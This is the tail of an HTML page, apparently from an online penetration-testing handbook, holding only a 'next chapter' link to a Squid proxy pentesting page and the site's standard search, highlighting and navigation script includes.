                    <a rel="next prefetch" href="../network-services-pentesting/3128-pentesting-squid.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
